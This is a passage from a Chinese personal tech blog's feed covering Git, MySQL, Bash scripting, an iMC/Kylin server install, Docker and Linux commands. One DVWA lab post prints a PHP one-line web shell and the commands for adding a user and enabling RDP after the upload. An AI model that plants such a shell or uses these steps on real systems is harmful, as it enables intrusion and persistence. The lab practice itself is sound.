id</code>需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，后面我们还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。</p></blockquote><p>首先，Git必须知道当前版本是哪个版本，在Git中，用<code>HEAD</code>表示当前版本，也就是最新的提交<code>1094adb...</code>（注意我的提交ID和你的肯定不一样），上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。</p><pre><code>$ git reset --hard HEAD^</code></pre><p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库复习风波</title>
      <link href="/2020/06/02/mysql-2/"/>
      <url>/2020/06/02/mysql-2/</url>
      
        <content type="html"><![CDATA[<p>写这篇文章的起因，实在是巧合，微信群里有人发了一张有关于数据库的面试题。本来想着自己会点儿，于是试着做一下。但由于自己也好久没用过数据库，很多基本的命令都忘记了。orz，真的是不做题都不知道自己其实根本就不会。学点皮毛又缺乏练习导致最后跟没学一样，这样看来，复习真的是太有必要了。不过自己一直都是随缘复习。发现自己不会了才会再进行复习。</p><p>觉得自己太废物了，自愧不如，再使用以下数据库，不使用数据库管理工具，完全使用命令来进行数据库的创建，删除等基础操作。再多练习一下增删改查。</p><pre><code class="mysql">mysql&gt; create table students(id int,name varchar(20),gender varchar(1),join_date date,birthday date) default charset=utf8;Query OK, 0 rows affected (0.01 sec)mysql&gt; insert into students(id,name,gender,join_date,birthday) values(1,&#39;张三&#39;,&#39;M&#39;,&#39;2020-01-01&#39;,&#39;2020-01-01&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from students;+------+--------+--------+------------+------------+| id   | name   | gender | join_date  | birthday   |+------+--------+--------+------------+------------+|    1 | 张三   | M      | 2020-01-01 | 2020-01-01 |+------+--------+--------+------------+------------+1 row in set (0.00 sec)</code></pre><p>创建一条表数据，发现mysql数据库一开始不能输入中文数据。需要修改编码格式才能正常运行。解决方法为在创建表的命令后面添加指定字符集的命令<code>default charset=utf8</code>。当然这只是临时解决办法。</p><p>如果要完全解决这个问题，只有修改配置文件。修改mysql配置文件/etc/my.cnf</p><pre><code>[mysqld]character-set-server=utf8 [client]default-character-set=utf8 [mysql]default-character-set=utf8</code></pre><p>还有就是格式化显示数据库的表格，有时候数据库的表格看不清楚需要进行处理。</p><ul><li><p>在命令后面添加<code>\g</code>这样数据会按照列显示。看的更明了一些。</p></li><li><p>使用方向键看左右的表格，esc可以退出</p><pre><code>mysql&gt; pager less -SFX;PAGER set to &#39;less -SFX&#39;</code></pre></li></ul><p>暂时就记录这些，之后在更新。</p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bash脚本应用记录</title>
      <link href="/2020/05/30/bash-2/"/>
      <url>/2020/05/30/bash-2/</url>
      
        <content type="html"><![CDATA[<p>最近一直在看关于脚本的书籍，但是没有需求就没有想要去实现的动力。不仅如此，只看不练的话其实没什么用，过一段时间就忘了。这可真是让人头疼的一件事，不练习的话看书总感觉是浪费时间的一件事。最近要安装一个平台，安装过程稍微有点繁琐。想着通过脚本提高效率。</p><hr><h2 id="Bash脚本应用"><a href="#Bash脚本应用" class="headerlink" title="Bash脚本应用"></a>Bash脚本应用</h2><p>通过脚本来实现功能。首先遇到的第一个需求是在文件中插入多行文字。</p><h3 id="在文件中添加多行文字"><a href="#在文件中添加多行文字" class="headerlink" title="在文件中添加多行文字"></a>在文件中添加多行文字</h3><pre><code class="bash"># 这是一个错误的脚本示范#!/bin/bashcd /etc/my.cnf.d/sed -i &#39;/\[mysqld\]/a\max_connections=1024lower_case_table_names=1innodb_buffer_pool_size=1Ginnodb_additional_mem_pool_size=24Mmax_allowed_packet=256Mcharacter-set-server=gbk&#39; server.cnfsystemctl restart mariadb.servicemysql_secure_installation</code></pre><p>踩的第一个坑就是换行符，运行后提示命令后含有多余的字符↵。多了一个回车符。</p><pre><code>不同操作系统下的含义：\n:  UNIX 系统行末结束符\r\n: window 系统行末结束符\r:  MAC OS 系统行末结束符</code></pre><blockquote><p>参考文档：<a href="https://www.pythontab.com/html/2017/linuxkaiyuan_0115/1116.html" target="_blank" rel="noopener">https://www.pythontab.com/html/2017/linuxkaiyuan_0115/1116.html</a></p></blockquote><p>于是正确的脚本为</p><pre><code class="bash">#!/bin/bashcd /etc/my.cnf.d/sed -i &#39;/\[mysqld\]/a\max_connections=1024\nlower_case_table_names=1\ninnodb_buffer_pool_size=1G\ninnodb_additional_mem_pool_size=24M\nmax_allowed_packet=256M\ncharacter-set-server=gbk&#39; server.cnfsystemctl restart mariadb.servicemysql_secure_installation</code></pre><p>通过脚本实现了第一个功能，在文件中添加多行内容。</p><h3 id="用脚本实现进度条"><a href="#用脚本实现进度条" class="headerlink" title="用脚本实现进度条"></a>用脚本实现进度条</h3><p>在网上摘抄的记录一下。</p><ul><li><p>按百分比显示进度</p><p><strong>printf %3d</strong>为显示百分比预留了3位，循环条件i每次递增5主要是为了减少进度条显示的长度</p><p><strong>i每次递增5，取模之后的index值还是依次循环，保证了转圈圈的方向和频率</strong></p><p>改用其他数字，转圈的显示效果没有add=4n+1时的好</p><p><img src="https://s1.ax1x.com/2020/05/30/tQQi7D.png" alt="tQQi7D.png"></p><pre><code>#!/bin/bashi=0str=&quot;&quot;arry=(&quot;|&quot; &quot;/&quot; &quot;-&quot; &quot;\\&quot;)while [ $i -le 100 ]do    let index=i%4    printf &quot;%3d%% %c%-20s%c\r&quot; &quot;$i&quot; &quot;${arry[$index]}&quot; &quot;$str&quot; &quot;${arry[$index]}&quot;    sleep 0.2    let i=i+5    str+=&quot;*&quot;doneecho &quot;&quot;</code></pre></li><li><p>进度条递进填充(绿色进度条)</p><p><strong>ssty size</strong>获取终端X轴和Y轴长度</p><p>total=total_stdx-2head 用来控制整个进度条的长度，左右各预留了head长度</p><p>per和remain相加永远是total大小</p><p>y;xH设置光标位置，${total_stdy};0H设置光标在终端的左下角</p><p>%${n}s指定了宽度为n个字符，%${per}s+%${remain}s的总宽是total不变的</p><p>设置两个不同颜色的宽度区域，用来显示进度变化，参数赋值空字符串</p><p><img src="https://s1.ax1x.com/2020/05/30/tQQ8hj.png" alt="tQQ8hj.png"></p><pre><code>#!/bin/bashtotal_stdy=&quot;$(($(stty size|cut -d&#39; &#39; -f1)))&quot;total_stdx=&quot;$(($(stty size|cut -d&#39; &#39; -f2)))&quot;head=&quot;Progress bar: &quot;total=$[${total_stdx} - ${#head}*2]i=0loop=100while [ $i -lt $loop ]do    let i=i+1    per=$[${i}*${total}/${loop}]    remain=$[${total} - ${per}]    printf &quot;\r\e[${total_stdy};0H${head}\e[42m%${per}s\e[47m%${remain}s\e[00m&quot; &quot;&quot; &quot;&quot;    sleep 0.1doneecho &quot;&quot;</code></pre><blockquote><p>进度条内容转自：<a href="http://yangtze736.github.io/技术/2018/05/02/shell-tips/" target="_blank" rel="noopener">http://yangtze736.github.io/%E6%8A%80%E6%9C%AF/2018/05/02/shell-tips/</a></p></blockquote></li></ul><h3 id="脚本运行提示确认"><a href="#脚本运行提示确认" class="headerlink" title="脚本运行提示确认"></a>脚本运行提示确认</h3><p>有些情况下需要确认脚本的运行环境。所以添加了一步用户确认的指令。这条指令在很多情况下是不可或缺的一部分。</p><h4 id="提示确认（输入错误则退出当前脚本）"><a href="#提示确认（输入错误则退出当前脚本）" class="headerlink" title="提示确认（输入错误则退出当前脚本）"></a>提示确认（输入错误则退出当前脚本）</h4><p>确认提示一次，如果你给输入错误，程序会以状态1退出。这个例子将只接受Y或N或YES或NO（不区分大小写）。</p><pre><code class="bash">#!/bin/bashread -r -p &quot;Are You Sure? [Y/n] &quot; inputcase $input in    [yY][eE][sS]|[yY])        echo &quot;Yes&quot;        ;;    [nN][oO]|[nN])        echo &quot;No&quot;           ;;    *)        echo &quot;Invalid input...&quot;        exit 1        ;;esac</code></pre><h4 id="提示确认（输入错误则需要重新输入）"><a href="#提示确认（输入错误则需要重新输入）" class="headerlink" title="提示确认（输入错误则需要重新输入）"></a>提示确认（输入错误则需要重新输入）</h4><pre><code class="bash">#!/bin/bashwhile truedo    read -r -p &quot;Are You Sure? [Y/n] &quot; input    case $input in        [yY][eE][sS]|[yY])            echo &quot;Yes&quot;            exit 1            ;;        [nN][oO]|[nN])            echo &quot;No&quot;            exit 1                           ;;        *)            echo &quot;Invalid input...&quot;            ;;    esacdone</code></pre><blockquote><p>原文链接：<a href="https://blog.csdn.net/liyyzz33/article/details/93497802" target="_blank" rel="noopener">https://blog.csdn.net/liyyzz33/article/details/93497802</a></p></blockquote><h3 id="脚本运行错误自动退出"><a href="#脚本运行错误自动退出" class="headerlink" title="脚本运行错误自动退出"></a>脚本运行错误自动退出</h3><p>让脚本在某条命令执行失败的时候停止执行后续的指令。</p><p>在Shell脚本中加入：<code>#!/bin/bash -e 或者 set -e</code>就能够让脚本在有错误的时候退出。</p><p>使用set -e 没有办法使用$? 来获取命令执行状态了，因为bash无法获得任何非0的返回值。你可以使用另一种结构，使用command。</p><pre><code class="bash">command ||  （echo &quot;command failed&quot;; exit 1） ; 或者使用： if ! command; then echo &quot;command failed&quot;; exit 1; fi判断句if [ $? -ne 0 ]; then            echo &quot;failed&quot;    else            echo &quot;succeed&quot;fi</code></pre><p>shell中的比较符号如下：</p><table><thead><tr><th align="center">-eq</th><th align="center">等于</th></tr></thead><tbody><tr><td align="center">-ne</td><td align="center">不等于</td></tr><tr><td align="center">-gt</td><td align="center">大于</td></tr><tr><td align="center">-lt</td><td align="center">小于</td></tr><tr><td align="center">ge</td><td align="center">大于等于</td></tr><tr><td align="center">le</td><td align="center">小于等于</td></tr></tbody></table><hr><p>mv etc/*   把目录下的文件移走</p><p>mv etc/ 把etc整个目录移走</p><p>sudo 命令需要输入当前用户的密码</p><p>su 命令需要输入 root 用户的密码。</p><p>&gt;&gt;的意思是追加的意思。</p><p>&gt; 的意思是重定向的意思，会覆盖原先的内容。</p>]]></content>
      
      
      
        <tags>
            
            <tag> bash </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装iMC智能管理中心</title>
      <link href="/2020/05/27/iMC/"/>
      <url>/2020/05/27/iMC/</url>
      
        <content type="html"><![CDATA[<p>仅以此做一下记录。</p><h2 id="服务器上安装iMC智能管理中心"><a href="#服务器上安装iMC智能管理中心" class="headerlink" title="服务器上安装iMC智能管理中心"></a>服务器上安装iMC智能管理中心</h2><ol><li>服务器安装系统前做磁盘阵列（此次使用的是raid5），提升磁盘读写速度，备份数据，保护数据安全。</li><li>安装操作系统，此次安装的是湖南麒麟系统，工作站运行模式。</li><li>安装数据库，安装iMC智能管理中心，部署平台组件。</li></ol><h3 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h3><ul><li>Kylin-3.3.4系统镜像</li><li>H3C_iMC_PLAT_7.3_E0703_Standard_linux.rar安装包</li><li>H3C_iMC_PLAT_7.3_E0703P08_linux.zip升级包</li><li>服务器一台（此次的服务器配置为64G运行内存，3.6T硬盘）</li></ul><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p><strong>服务器做raid</strong></p><ol><li>开启服务器，（按Ese、F7或F12）进入BIOS，SETUP模式做磁盘阵列。</li><li>服务器型号不同，做raid的方法也不同，所有磁盘默认情况下未开启，需要开启后在配置raid5。</li><li>具体型号参考官方文档。</li></ol><blockquote><p>参考文档：<a href="https://cloud.tencent.com/developer/news/392275" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/392275</a></p></blockquote><hr><p><strong>服务器安装操作系统</strong></p><ol><li>使用笔记本连接到服务器远程管理端口：HDM，默认IP为192.168.1.2.默认用户名密码为<code>admin/Password@_</code></li><li>查看服务器状态是否正常。</li><li>之后挂载系统镜像。查看服务器BIOS中是否识别挂载的镜像。连接成功后，重启服务器。</li><li>按照提示安装操作系统。分区按自定义推荐的分区进行修改即可完成。</li></ol><hr><p><strong>安装iMC平台软件</strong></p><ol><li><p>服务器无法联网，首先要挂载系统镜像安装数据库。</p></li><li><p>修改yum源为本地镜像，vi /etc/yum.repos.d/Kylin-Base.repo</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9USO.png" alt="tE9USO.png"></p></li><li><p><code>yum makecache</code>刷新yum的数据缓存。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9alD.png" alt="tE9alD.png"></p></li><li><p>安装mariadb数据库和imc运行需要的32位库软件<br>yum install mariadb-server ncurses-libs.i686 libaio.i686</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9ykt.png" alt="tE9ykt.png"></p></li><li><p>安装成功过，修改数据库内容，编辑文件/etc/my.cnf.d/server.cnf。在[mysqld]下添加参数内容。</p><p>[mysqld]</p><p>max_connections=1024</p><p>lower_case_table_names=1</p><p>innodb_buffer_pool_size=1G</p><p>innodb_additional_mem_pool_size=24M </p><p>max_allowed_packet=256M </p><p>character-set-server=gbk</p><p><img src="https://s1.ax1x.com/2020/05/27/tE96tP.png" alt="tE96tP.png"></p></li><li><p>重启数据库mariadb，运行<code>mysql_secure_installation</code>初始化数据库配置。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE92p8.png" alt="tE92p8.png"></p></li><li><p>密码为空密码，回车进入下一步。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9W6g.png" alt="tE9W6g.png"></p><p>设置数据库root用户密码(imc软件安装时对密码字符有限制，尽量不要使用特殊符号)，后面设置项全部回车，使用默认选项。</p></li><li><p><code>vi ./H3C_iMC_PLAT_7.3_E0703_Standard_linux/linux/install/install.sh</code>修改最后一行DUnsupportMysql参数的值为false</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9fXQ.png" alt="tE9fXQ.png"></p></li><li><p>开始安装imc，进入imc安装包的install目录，以root权限运行install.sh文件</p><p><img src="https://s1.ax1x.com/2020/05/27/tE94mj.png" alt="tE94mj.png"></p></li><li><p>选择典型安装确定好后，弹出检查安装参数，填写正确的信息，即可安装并部署平台所有的组件。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9I7n.png" alt="tE9I7n.png"></p></li><li><p>检查安装环境出现错误。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE97t0.png" alt="tE97t0.png"></p><p>最后发现是之前修改的max_connections参数未生效，通过数据库查询<code>show variables like &#39;%max_connections%&#39;;</code>值为214。与设置的数值不一致。</p></li><li><p>解决方法为修改数据库配置文件参数。</p><blockquote><p>vi /usr/lib/systemd/system/mariadb.service<br>在[Service]标签下设置如下两个参数<br>LimitNOFILE=65535<br>LimitNPROC=65535<br>保存，退出。<br>systemctl daemon-reload<br>systemctl restart mariadb.service </p></blockquote><p>在使用数据库查询，<code>show variables like &#39;%max_connections%&#39;;</code>值为1024。与设置的数值一致。然后重新执行第9步。</p></li><li><p>安装成功。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9qpT.png" alt="tE9qpT.png"></p></li><li><p>使用网页打开管理页面，admin/admin登录。</p><p><img src="https://s1.ax1x.com/2020/05/27/tE9XX4.png" alt="tE9XX4.png"></p></li><li><p>到这一步，软件安装就完成了。接下来要把软件升级到最新版，使用H3C_iMC_PLAT_7.3_E0703P08_linux.zip升级包</p><p><img src="https://s1.ax1x.com/2020/05/27/tECpA1.png" alt="tECpA1.png"></p></li><li><p>升级成功，浏览器清除缓存后重新登录就完事了。</p><p><img src="https://s1.ax1x.com/2020/05/27/tECCh6.png" alt="tECCh6.png"></p></li><li><p>完</p></li></ol><h3 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h3><p>为了提高效率，写了这个安装脚本，虽然不够完美，但确实简化了修改配置文件的步骤。</p><p>以下是脚本文件内容。运行该脚本前要修改yum源从挂载的镜像进行更新。运行后再执行iMC安装脚本就可以。</p><pre><code class="bash">#!/bin/bash -eecho &quot;!!!!运行脚本之前确保系统镜像已挂载，yum源能正常使用，将imc安装包复制到/tmp目录下!!!!&quot;#!/bin/bashread -r -p &quot;Are You Sure? [Y/n] &quot; inputcase $input in    [yY][eE][sS]|[yY])        echo &quot;Yes&quot;        ;;    [nN][oO]|[nN])        echo &quot;No&quot;        ;;    *)        echo &quot;Invalid input...&quot;        exit 1        ;;esacyum makecacheyum -y install mariadb-server ncurses-libs.i686 libaio.i686cd /etc/my.cnf.d/sed -i &#39;/\[mysqld\]/a\max_connections=1024\nlower_case_table_names=1\ninnodb_buffer_pool_size=1G\ninnodb_additional_mem_pool_size=24M\nmax_allowed_packet=256M\ncharacter-set-server=gbk&#39; server.cnf systemctl restart mariadb.servicemysql_secure_installationcd /tmp/H3C_iMC_PLAT_7.3_E0703_Standard_linux/linux/install/sed -i &quot;s/DUnsupportMySQL=true/DUnsupportMySQL=false/g&quot; install.shcd /usr/lib/systemd/system/sed -i &#39;/\[Service\]/a\LimitNOFILE=65535\nLimitNPROC=65535&#39; mariadb.servicesystemctl daemon-reloadsystemctl restart mariadb.servicecd /tmp/H3C_iMC_PLAT_7.3_E0703_Standard_linux/linux/install/chmod u+x install.shecho &quot;请执行这条命令开始安装  sh /tmp/H3C_iMC_PLAT_7.3_E0703_Standard_linux/linux/install/install.sh&quot;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Kylin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kylin系统单用户重置密码</title>
      <link href="/2020/05/26/Kylin-1/"/>
      <url>/2020/05/26/Kylin-1/</url>
      
        <content type="html"><![CDATA[<p>安装系统时，创建了新用户并勾选了设置为管理员。登陆后却没有权限，也无法切换其他用户。secadm、sysadm在创建系统是未配置。在登录界面也无法正常登录。无果，联系湖南麒麟客服热线，无人接听。没办法，由于湖南麒麟也是用的Linux内核，只能尝试通过Linux系统重置密码的方式来尝试一下。</p><h2 id="Kylin3-3-4系统忘记密码使用单用户模式修改密码"><a href="#Kylin3-3-4系统忘记密码使用单用户模式修改密码" class="headerlink" title="Kylin3.3.4系统忘记密码使用单用户模式修改密码"></a>Kylin3.3.4系统忘记密码使用单用户模式修改密码</h2><ol><li>重启服务器，在启动界面按‘e’键进入编辑模式。</li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFHgJI.png" alt="tFHgJI.png"></p><ol start="2"><li>找到<code>linux16</code>开头的段，在<code>UTF-8</code>后面添加<code>init=/bin/sh</code>，同时删除<code>rhgb quite</code>参数。 </li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFbpTJ.png" alt="tFbpTJ.png"></p><p>修改完成后，如下图所示。</p><p><img src="https://s1.ax1x.com/2020/05/26/tFbGX8.png" alt="tFbGX8.png"></p><ol start="3"><li><code>CTRL+x</code>重启系统，登录到不需要密码的系统。重新挂载根目录<code>/</code>否则没有写权限。按照正常操作修改密码。</li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFbdts.png" alt="tFbdts.png"></p><ol start="4"><li>密码修改完成后，编辑配置文件/etc/sysconfig/selinux，关闭Linux安全模块。</li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFbD10.png" alt="tFbD10.png"></p><ol start="5"><li>运行<code>touch /.autorelabel</code>使配置生效。然后运行<code>exec /sbin/init</code>重启系统。</li></ol><p><img src="https://s1.ax1x.com/2020/05/26/tFbsXT.png" alt="tFbsXT.png"></p><ol start="6"><li>如果之前的操作没问题的话，就可以根据修改后的密码正常登入系统了。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Kylin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令行读书笔记</title>
      <link href="/2020/05/24/linux-1/"/>
      <url>/2020/05/24/linux-1/</url>
      
        <content type="html"><![CDATA[<p>今天看了Linux shell脚本编程大全，对linux系统又进行了学习。</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>Linux内核</li><li>GNU工具</li><li>图形化桌面环境</li><li>应用软件</li></ul><p><img src="https://s1.ax1x.com/2020/05/24/tSo18H.png" alt="tSo18H.png"></p><h3 id="Linux内核功能"><a href="#Linux内核功能" class="headerlink" title="Linux内核功能"></a>Linux内核功能</h3><ul><li><p>系统内存管理</p><p>管理物理内存和虚拟内存。</p></li><li><p>软件程序管理</p><p>内核创建了第一个进程(称为init进程)来启动系统上所有其他进程。当内核启动时，它会将init进程加载到虚拟内存中。内核在启动任何其他进程时，都会在虚拟内存中给新进程分配一块专有区域来存储该进程用到的数据和代码。</p><ul><li><p>运行级为1时，只启动基本的系统进程以及一个控制台终端进程。一般称之为单用户模式。</p></li><li><p>标准启动运行级为3级，大多数应用和网络程序会启动。</p></li><li><p>运行级为5，为Linux启动图形化的系统。</p></li></ul></li><li><p>硬件设备管理</p></li><li><p>文件系统管理</p><p><img src="https://s1.ax1x.com/2020/05/24/tSo32d.png" alt="tSo32d.png"></p></li></ul><h3 id="Linux文件系统结构"><a href="#Linux文件系统结构" class="headerlink" title="Linux文件系统结构"></a>Linux文件系统结构</h3><p><img src="https://s1.ax1x.com/2020/05/24/tSoEvR.png" alt="tSoEvR.png"></p><p>shell提示符</p><blockquote><p>$ 普通用户输入模式</p><p># root用户输入模式</p></blockquote><p>bash手册</p><p>相对路径</p><ul><li>. 表示当前目录</li><li>.. 表示当前目录的父目录</li></ul><p>目录（d）、文件（-）、字符型文件（c）、块设备（b）。</p><p>ln -s 源文件 快捷方式</p><p>可以给原始文件创建多个软连接。</p><blockquote><p>需要注意的是，不要创建软连接文件的软链接。容易造成不必要的麻烦。</p></blockquote><p>查看文件类型 file myfile</p><p>cat -n myfile</p><p>killall命令支持通过进程名来结束进程。</p><p>du -h查看磁盘使用情况，查找大文件。</p><p>sort排序文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker记录</title>
      <link href="/2020/05/16/Docker-1/"/>
      <url>/2020/05/16/Docker-1/</url>
      
        <content type="html"><![CDATA[<p>以前听过docker这个名字，最近听的有点多了，于是就想简单了解一下docker到底是个什么东西，对我有没有一些帮助，于是在B站上看了一个docker入门视频。</p><h3 id="Docker是什么？"><a href="#Docker是什么？" class="headerlink" title="Docker是什么？"></a>Docker是什么？</h3><p>Docker是一个轻量级的虚拟机，是一个主要应用在linux的虚拟机。<br>包括镜像，容器(虚拟机)，tar文件(vmdk文件)，Dockerfile是配置文件。还有一个仓库（有很多系统镜像文件）。<br>通过load加载镜像，run运行虚拟机。</p><p>[网页版docker]<a href="https://labs.play-with-docker.com" target="_blank" rel="noopener">https://labs.play-with-docker.com</a></p><h3 id="Docker使用参数"><a href="#Docker使用参数" class="headerlink" title="Docker使用参数"></a>Docker使用参数</h3><p>docker pull nginx等于docker pull  nginx:latest<br>Docker images查看已安装的镜像。</p><p><img src="https://s1.ax1x.com/2020/05/16/Y6bGjg.png" alt="Y6bGjg.png"></p><p>docker run -d（后台运行）-p（端口） 外部端口：内部端口 nginx</p><p>decker exec -it ID bash，修改容器（虚拟机）配置。</p><p>ctrl+F5强制刷新。</p><p>docker stop ID 先停止容器</p><p>docker rm -f ID删除已停止运行的容器</p><p>docker commit ID 自定义名字</p><p>docker images 查看所有镜像</p><p>docker ps -a查看所有容器</p><p>docker build -t 镜像名 .</p><p>docker save 镜像名 &gt; 1.tar</p><p>docker load &lt;  1.tar</p><p>-p映射内外端口，-v映射文件</p><p><strong>Docker环境信息</strong></p><ul><li>sudo docker info</li><li>sudo docker version</li></ul><p><strong>容器生命周期管理</strong></p><ul><li><p>sudo docker run –help</p></li><li><p>sudo -i -t  –name xxxx ubuntu:latest /bin/bash</p><blockquote><p>-i选项表示使用交互模式，始终保持输人流开放;<br>-t选项表示分配一个伪终端，一般两个参数结合时使用-it，即可在容器中利用打开的伪终端进行交互操作;<br>– name选项可以指定docker run命令启动的容器的名字，若无此选项，Docker将 为容器随机分配一个名字。</p></blockquote></li><li><p>sudo docker start/stop/restart</p></li><li><p>sudo docker pull ubuntu12.04</p></li><li><p>sudo docker images             //查看主机上的所有镜像</p></li><li><p>docker rmi 删除镜像</p></li><li><p>docker rm 删除容器</p></li></ul><p><strong>系统日志信息</strong></p><p>events、history 和logs这3个命令用于查看Docker的系统日志信息。</p><ul><li>events命令会打印出实时的系统事件; </li><li>history命令会打印出指定镜像的历史版本信息，即构建该镜像的每一层镜像的<br>命令记录; </li><li>logs命令会打印出容器中进程的运行日志。</li></ul><h3 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h3><pre><code class="c">docker pull ubuntu:latestdocker run -it ubuntu bash//docker exec -it ubuntu bash//docker exec -it ID bashapt-get updateapt-get install vimecho $PATH</code></pre><hr><p>一个容器只运行一个进程。所以要使用多个容器。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令上传漏洞利用</title>
      <link href="/2020/05/10/dvwa-2/"/>
      <url>/2020/05/10/dvwa-2/</url>
      
        <content type="html"><![CDATA[<p>之前的测试没做完，先做一点。(っ °Д °;)っ</p><h2 id="命令上传漏洞利用"><a href="#命令上传漏洞利用" class="headerlink" title="命令上传漏洞利用"></a>命令上传漏洞利用</h2><p>练习dvwa中的文件上传漏洞，想着把之前的一句话木马拿过来用，发现之前做的时候没留下痕迹，\┑(￣Д ￣)┍于是从网上找一句话木马再测试一下。</p><p>最简单的一句话木马。</p><pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><p>之前还有比较复杂的，但当时做的时候什么也没有留下。现在还是的重头再来。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3vqr4.png" alt="Y3vqr4.png"></p><p>上传成功，找菜刀连接，又在电脑上找之前下载过的菜刀。orz，最后找到了中国蚁剑。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3vzPx.png" alt="Y3vzPx.png"></p><p>填入文件上传后的地址和密码，编码设置成GB2312（否则接入终端会出现乱码），</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xpRK.png" alt="Y3xpRK.png"></p><p>连接成功后，查看系统中存在的用户，并创建一个新用户test。</p><p><code>net user 用户名 密码（可选） /add</code></p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xeit.png" alt="Y3xeit.png"></p><p>使用远程连接192.168.1.132，连接被拒绝。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xnRf.png" alt="Y3xnRf.png"></p><p>打开3389端口，还是连接被拒绝。</p><blockquote><p>1）开启3389端口：<br>在cmd内，执行如下命令，即可开启3389端口。</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p><p>2）关闭3389端口：<br>在cmd内，执行如下命令，即可关闭3389端口。</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</p></blockquote><p>猜测新建的用户没权限。于是想办法把用户添加到系统组。系统组名称不知道查看已存在的系统用户组。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3x8ds.png" alt="Y3x8ds.png"></p><p>得到系统用户组名administrators。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xUzT.png" alt="Y3xUzT.png"></p><p>命令执行成功。运行mstsc。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xdQU.png" alt="Y3xdQU.png"></p><p>完。</p>]]></content>
      
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中的nc命令和scp命令</title>
      <link href="/2020/05/04/linux-3/"/>
      <url>/2020/05/04/linux-3/</url>
      
        <content type="html"><![CDATA[<p>这几个命令平常不怎么用，但是实际用途还是有的。就先记录一下。</p><h3 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h3><p><strong>lastb命令</strong>用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行lastb命令，它会读取位于<code>/var/log</code>目录下，名称为btmp的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。</p><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><strong>nc命令</strong>是<strong>netcat命令</strong>的简称。</p><ul><li><p>远程拷贝文件</p><p>server1上的文件拷贝到server2中。</p><ul><li><p>server2中运行</p><blockquote><p>netcat -lp 1234 &gt; 123.txt<br>netcat -lp 1234 &gt; 456.txt</p></blockquote></li><li><p>server1中运行</p><blockquote><p>nc -w 1 192.168.1.128 1234 &lt; 123.txt<br>nc -w 1 192.168.1.128 1234 &lt; 456.txt</p></blockquote></li></ul></li></ul><h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p><strong>scp命令</strong>用于在Linux下进行远程拷贝文件的命令，和它类似的命令有<a href="http://man.linuxde.net/cp" target="_blank" rel="noopener">cp</a>，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读<a href="http://man.linuxde.net/read" target="_blank" rel="noopener">read</a> only system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，<a href="http://man.linuxde.net/rsync" target="_blank" rel="noopener">rsync</a>就远远不及它了。虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。</p><blockquote><p>scp <a href="mailto:root@192.168.1.128">root@192.168.1.128</a>:/home/duyada/scp/123.txt /scp</p><p>//复制到本机</p><p>scp /scp/456.txt <a 